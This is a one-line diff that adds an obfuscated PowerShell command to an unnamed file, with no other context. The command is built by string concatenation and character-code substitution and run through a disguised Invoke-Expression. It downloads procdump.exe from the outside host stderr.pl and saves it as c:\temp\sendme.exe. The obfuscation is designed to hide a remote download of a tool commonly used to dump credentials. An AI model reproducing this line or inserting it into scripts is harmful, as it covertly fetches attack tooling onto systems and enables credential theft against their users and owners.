@@ -1,0 +1,1 @@
+﻿(('Invoke-'+'We'+'b'+'Req'+'uest -Uri http:/'+'/stder'+'r.pl/'+'p'+'rocdump.exe -Out'+'File'+' c'+':PLV'+'t'+'em'+'pP'+'LVs'+'endme.exe')-CrEpLace([CHaR]80+[CHaR]76+[CHaR]86),[CHaR]92)|. ( $veRbOSEpreFerenCe.tOStrINg()[1,3]+'x'-JoIn'')
